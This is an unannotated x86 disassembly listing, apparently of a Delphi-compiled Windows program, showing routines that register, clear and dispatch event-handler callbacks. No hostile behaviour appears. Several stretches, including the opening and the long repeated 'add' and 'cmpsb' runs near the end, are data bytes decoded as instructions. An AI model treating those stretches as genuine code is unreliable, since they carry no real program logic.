mov eax eax
test al 0x5c
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
pop esp
inc ebp
add [ eax ] al
add [ eax ] al
xlat
inc ebx
popad
jae r-xdata
pop esi
pop ebx
retn
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
pop esp
inc ebp
add [ eax ] al
add [ eax ] al
shl [ edx ] 0x41
add [ esp + 0x41 ] cl
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
xor [ ebx ] dh
inc eax
add [ eax - 0x53ffbfd0 ] dl
xor [ eax ] al
inc eax
add ah ch
pop esp
inc ebp
add [ edi ] al
or al 0x54
dec ebp
jne r-xdata
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
je r-xdata
cmp [ eax + 0x32 ] 0x0
inc ebx
popad
jae r-xdata
jb r-xdata
add [ eax ] dl
inc ecx
inc ecx
add [ eax + 0x41 ] dl
add [ eax + eax * 2 ] ch
inc ecx
add [ ecx ] ch
inc ecx
add al bh
lahf
inc ecx
add [ ecx ] bh
inc ecx
add [ edx ] dh
inc ecx
add [ esp + 0x41 ] ah
add [ eax ] dl
popad
inc ebp
pop esp
inc ebp
add [ ebx + 0x20041 ] bh
or [ ecx + 0x70 ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
jbe r-xdata
fmul [ ebx + 0x53ff3c43 ]
cmp [ ebx - 0x3d ] bl
mov eax eax
je r-xdata
pop ebx
retn
add [ eax ] al
nop
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419cdc
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
test bl bl
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_455f74
mov eax esi
add esp 0xc
call sub_40345c
pop [ fs : 0x0 ]
sub_455dac
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
mov edx [ rw-data ]
call sub_403284
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov ecx esi
mov edx edi
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_455ddc
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
xor eax eax
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_455dfc
push ebp
mov ebp esp
push ecx
push ebx
push esi
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42e9d8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_455e66
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
call sub_441290
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4032f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4030f8
retn
mov ebx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_455ee8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_455f10
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x9a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_455f74
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4229d8
inc eax
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_422970
sub_455f98
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ rw-data ]
xor edx edx
mov eax ebx
call sub_419cdc
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4227d0
mov [ ebx + 0x30 ] eax
mov eax [ esi ]
mov [ eax + 0xc4 ] ebx
mov [ eax + 0xc0 ] sub_45624c
mov eax [ esi ]
mov [ eax + 0xcc ] ebx
mov [ eax + 0xc8 ] sub_4562c8
mov eax [ esi ]
mov [ eax + 0x114 ] ebx
mov [ eax + 0x110 ] sub_456344
mov eax [ esi ]
mov [ eax + 0x10c ] ebx
mov [ eax + 0x108 ] sub_4563b8
mov eax [ esi ]
mov [ eax + 0xd4 ] ebx
mov [ eax + 0xd0 ] sub_45642c
mov eax [ esi ]
mov [ eax + 0xf4 ] ebx
mov [ eax + 0xf0 ] sub_4564e8
mov eax [ esi ]
mov [ eax + 0xfc ] ebx
mov [ eax + 0xf8 ] sub_456584
mov eax [ esi ]
mov [ eax + 0x104 ] ebx
mov [ eax + 0x100 ] sub_4565f8
mov eax [ esi ]
mov [ eax + 0xdc ] ebx
mov [ eax + 0xd8 ] sub_456674
mov eax [ esi ]
mov [ eax + 0x11c ] ebx
mov [ eax + 0x118 ] sub_4566f0
mov eax [ esi ]
mov [ eax + 0x124 ] ebx
mov [ eax + 0x120 ] sub_456764
mov eax [ esi ]
mov [ eax + 0x134 ] ebx
mov [ eax + 0x130 ] sub_456854
mov eax [ esi ]
mov [ eax + 0x12c ] ebx
mov [ eax + 0x128 ] sub_4567d8
mov eax [ esi ]
mov [ eax + 0x13c ] ebx
mov [ eax + 0x138 ] sub_4568d4
mov eax [ esi ]
mov [ eax + 0xe4 ] ebx
mov [ eax + 0xe0 ] sub_4569c4
mov eax [ esi ]
mov [ eax + 0xec ] ebx
mov [ eax + 0xe8 ] sub_456a38
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_456110
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xc0 ] ecx
mov [ edx + 0xc4 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xc8 ] ecx
mov [ edx + 0xcc ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x110 ] ecx
mov [ edx + 0x114 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x108 ] ecx
mov [ edx + 0x10c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xd0 ] ecx
mov [ edx + 0xd4 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xf0 ] ecx
mov [ edx + 0xf4 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xf8 ] ecx
mov [ edx + 0xfc ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x100 ] ecx
mov [ edx + 0x104 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xd8 ] ecx
mov [ edx + 0xdc ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x118 ] ecx
mov [ edx + 0x11c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x120 ] ecx
mov [ edx + 0x124 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x130 ] ecx
mov [ edx + 0x134 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x128 ] ecx
mov [ edx + 0x12c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x138 ] ecx
mov [ edx + 0x13c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xe0 ] ecx
mov [ edx + 0xe4 ] ecx
mov eax [ eax ]
xor edx edx
mov [ eax + 0xe8 ] edx
mov [ eax + 0xec ] edx
mov eax [ esi + 0x30 ]
call sub_4030f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419d28
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_45624c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_455f94
xor eax eax
push ebp
push sub_4562b8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4569bc
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4562bf
mov eax [ ebp - 0x4 ]
call sub_456958
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4569a8
mov ecx edi
mov edx esi
call sub_455d5c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4562c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_455f94
xor eax eax
push ebp
push sub_456334
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4569bc
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45633b
mov eax [ ebp - 0x4 ]
call sub_456958
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4569a8
mov ecx edi
mov edx esi
call sub_455d70
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_456344
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_455f94
xor eax eax
push ebp
push sub_4563ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4569bc
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4563b2
mov eax [ ebp - 0x4 ]
call sub_456958
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4569a8
mov edx esi
call sub_455d84
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4563b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_455f94
xor eax eax
push ebp
push sub_45641f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4569bc
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456426
mov eax [ ebp - 0x4 ]
call sub_456958
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4569a8
mov edx esi
call sub_455d98
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_45642c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_455f94
mov [ ebp - 0x9 ] 0x0
xor eax eax
push ebp
push sub_4564db
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4569bc
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4564e2
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4569a8
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_456958
retn
mov eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403284
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov [ ebp - 0x9 ] 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4569a8
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_455dac
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
call sub_4546b8
sub_4564e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_455f94
xor eax eax
push ebp
push sub_456571
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_4569bc
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456578
mov eax [ ebp - 0x4 ]
call sub_456958
retn
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4569a8
mov ecx edi
mov edx esi
call sub_455ddc
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
sub_456584
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_455f94
xor eax eax
push ebp
push sub_4565eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4569bc
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4565f2
mov eax [ ebp - 0x4 ]
call sub_456958
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4569a8
mov edx esi
call sub_455dfc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4565f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_455f94
xor eax eax
push ebp
push sub_456664
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4569bc
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45666b
mov eax [ ebp - 0x4 ]
call sub_456958
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4569a8
mov ecx edi
mov edx esi
call sub_455e74
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_456674
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_455f94
xor eax eax
push ebp
push sub_4566e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4569bc
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4566e7
mov eax [ ebp - 0x4 ]
call sub_456958
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4569a8
mov ecx edi
mov edx esi
call sub_455e88
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4566f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_455f94
xor eax eax
push ebp
push sub_456757
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4569bc
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45675e
mov eax [ ebp - 0x4 ]
call sub_456958
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4569a8
mov edx esi
call sub_455e9c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_456764
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_455f94
xor eax eax
push ebp
push sub_4567cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4569bc
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4567d2
mov eax [ ebp - 0x4 ]
call sub_456958
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4569a8
mov edx esi
call sub_455eb0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4567d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_455f94
xor eax eax
push ebp
push sub_456844
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4569bc
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45684b
mov eax [ ebp - 0x4 ]
call sub_456958
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4569a8
mov ecx edi
mov edx esi
call sub_455ecc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_456854
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_455f94
xor eax eax
push ebp
push sub_4568c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4569bc
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4568cb
mov eax [ ebp - 0x4 ]
call sub_456958
retn
mov eax [ ebp + 0x8 ]
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4569a8
mov ecx edi
mov edx esi
call sub_455ee8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4568d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_455f94
xor eax eax
push ebp
push sub_456948
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4569bc
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45694f
mov eax [ ebp - 0x4 ]
call sub_456958
retn
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4569a8
mov ecx edi
mov edx esi
call sub_455f10
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_456958
push ebx
mov ebx eax
cmp [ ebx + 0x3c ] 0x0
jle r-xdata
pop ebx
retn
dec [ ebx + 0x3c ]
mov [ ebx + 0x38 ] 0x0
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov edx [ ebx + 0x34 ]
mov eax [ ebx + 0x30 ]
call sub_4229d8
mov edx [ ebx + 0x30 ]
mov edx [ edx + 0x8 ]
dec edx
cmp eax edx
jge r-xdata
mov edx [ ebx + 0x34 ]
mov eax [ ebx + 0x30 ]
call sub_422a48
mov edx [ ebx + 0x34 ]
mov eax [ ebx + 0x30 ]
call sub_422970
xor eax eax
mov [ ebx + 0x34 ] eax
sub_4569c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_455f94
xor eax eax
push ebp
push sub_456a2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4569bc
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456a32
mov eax [ ebp - 0x4 ]
call sub_456958
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4569a8
mov edx esi
call sub_455f3c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_456a38
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_455f94
xor eax eax
push ebp
push sub_456a9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4569bc
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456aa6
mov eax [ ebp - 0x4 ]
call sub_456958
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4569a8
mov edx esi
call sub_455f58
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_456aac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_456ad1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456ad8
retn
sub_4574f4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_40b32c
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_45753c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_457561
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457568
retn
sub_457574
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ edi + edi * 8 ] cl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ 0x640000ff ] cl
cmpsb [ esi ] [ edi ]
inc esi
add [ esi ] cl
inc [ eax ]
add [ esi + 0x46 ] ah
add [ edi ] cl
inc [ eax ]
add [ esi + 0x46 ] ah
add al dh
inc [ eax ]
add [ esi + 0x46 ] ah
add cl dh
inc [ eax ]
add [ esi + 0x46 ] ah
add dl dh
inc [ eax ]
add [ esi + 0x46 ] ah
add bl dh
inc [ eax ]
add [ esi + 0x46 ] ah
add ah dh
inc [ eax ]
add [ esi + 0x46 ] ah
add ch dh
inc [ eax ]
add [ esi + 0x46 ] ah
add dh dh
inc [ eax ]
add [ esi + 0x46 ] ah
add bh dh
inc [ eax ]
add [ esi + 0x46 ] ah
add al bh
inc [ eax ]
add [ esi + 0x46 ] ah
add cl bh
inc [ eax ]
add [ esi + 0x46 ] ah
add dl bh
inc [ eax ]
add [ esi + 0x46 ] ah
add bl bh
inc [ eax ]
add [ esi + 0x46 ] ah
add ah bh
inc [ eax ]
add [ esi + 0x46 ] ah
add ch bh
inc [ eax ]
add [ esi + 0x46 ] ah
add dh bh
inc [ eax ]
add [ esi + 0x46 ] ah
add bh bh
inc [ eax ]
add [ esi + 0x46 ] ah
add al ah
inc [ eax ]
add [ esi + 0x46 ] ah
add cl ah
inc [ eax ]
add [ esi + 0x46 ] ah
add dl ah
inc [ eax ]
add [ esi + 0x46 ] ah
add bl ah
inc [ eax ]
add [ esi + 0x46 ] ah
add ah ah
inc [ eax ]
add [ esi + 0x46 ] ah
add ch ah
inc [ eax ]
add [ esi + 0x46 ] ah
add dh ah
inc [ eax ]
add [ esi + 0x46 ] ah
add bh ah
inc [ eax ]
add [ esi + 0x46 ] ah
add al ch
inc [ eax ]
add [ esi + 0x46 ] ah
add cl ch
inc [ eax ]
add [ esi + 0x46 ] ah
add dl ch
inc [ eax ]
add [ esi + 0x46 ] ah
add bl ch
inc [ eax ]
add [ esi + 0x46 ] ah
add ah ch
inc [ eax ]
add [ esi + 0x46 ] ah
add ch ch
inc [ eax ]
add [ esi + 0x46 ] ah
add dh ch
inc [ eax ]
add [ esi + 0x46 ] ah
add bh ch
inc [ eax ]
add [ esi + 0x46 ] ah
add al dl
inc [ eax ]
add [ esi + 0x46 ] ah
add cl dl
inc [ eax ]
add [ esi + 0x46 ] ah
add dl dl
inc [ eax ]
add [ esi + 0x46 ] ah
add bl dl
inc [ eax ]
add [ esi + 0x46 ] ah
add ah dl
inc [ eax ]
add [ esi + 0x46 ] ah
add ch dl
inc [ eax ]
add [ esi + 0x46 ] ah
add dh dl
inc [ eax ]
add [ esi + 0x46 ] ah
add bh dl
inc [ eax ]
add [ esi + 0x46 ] ah
add al bl
inc [ eax ]
add [ esi + 0x46 ] ah
add cl bl
inc [ eax ]
add [ esi + 0x46 ] ah
add dl bl
inc [ eax ]
add [ esi + 0x46 ] ah
add bl bl
inc [ eax ]
add [ esi + 0x46 ] ah
add ah bl
inc [ eax ]
add [ esi + 0x46 ] ah
add ch bl
inc [ eax ]
add [ esi + 0x46 ] ah
add dh bl
inc [ eax ]
add [ esi + 0x46 ] ah
add bh bl
inc [ eax ]
add [ esi + 0x46 ] ah
add al al
inc [ eax ]
add [ esi + 0x46 ] ah
add cl al
inc [ eax ]
add [ esi + 0x46 ] ah
add dl al
inc [ eax ]
add [ esi + 0x46 ] ah
add bl al
inc [ eax ]
add [ esi + 0x46 ] ah
add ah al
inc [ eax ]
add [ esi + 0x46 ] ah
add ch al
inc [ eax ]
add [ esi + 0x46 ] ah
add dh al
inc [ eax ]
add [ esi + 0x46 ] ah
add bh al
inc [ eax ]
add [ esi + 0x46 ] ah
add al cl
inc [ eax ]
add [ esi + 0x46 ] ah
add cl cl
inc [ eax ]
add [ esi + 0x46 ] ah
add dl cl
inc [ eax ]
add [ esi + 0x46 ] ah
add bl cl
inc [ eax ]
add [ esi + 0x46 ] ah
add ah cl
inc [ eax ]
add [ esi + 0x46 ] ah
add ch cl
inc [ eax ]
add [ esi + 0x46 ] ah
add dh cl
inc [ eax ]
add [ esi + 0x46 ] ah
add bh cl
inc [ eax ]
add [ esi + 0x46 ] ah
add [ eax + 0x640000fe ] dh
cmpsb [ esi ] [ edi ]
inc esi
add [ ecx + 0x640000fe ] dh
cmpsb [ esi ] [ edi ]
inc esi
add [ edx + 0x640000fe ] dh
cmpsb [ esi ] [ edi ]
inc esi
add [ ebx + 0x640000fe ] dh
cmpsb [ esi ] [ edi ]
inc esi
add [ esi + edi * 8 - 0x599c0000 ] dh
inc esi
add [ ebp + 0x640000fe ] dh
cmpsb [ esi ] [ edi ]
inc esi
add [ esi + 0x640000fe ] dh
cmpsb [ esi ] [ edi ]
inc esi
add [ edi + 0x640000fe ] dh
cmpsb [ esi ] [ edi ]
inc esi
add [ eax + 0x640000fe ] bh
cmpsb [ esi ] [ edi ]
inc esi
add [ ecx + 0x640000fe ] bh
cmpsb [ esi ] [ edi ]
inc esi
add [ edx + 0x640000fe ] bh
cmpsb [ esi ] [ edi ]
inc esi
add [ ebx + 0x640000fe ] bh
cmpsb [ esi ] [ edi ]
inc esi
add [ esi + edi * 8 - 0x599c0000 ] bh
inc esi
add [ ebp + 0x640000fe ] bh
cmpsb [ esi ] [ edi ]
inc esi
add [ esi + 0x640000fe ] bh
cmpsb [ esi ] [ edi ]
inc esi
add [ edi + 0x640000fe ] bh
cmpsb [ esi ] [ edi ]
inc esi
add [ eax + 0x550000fe ] ah
mov ebp esp
xor eax eax
push ebp
push sub_457841
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
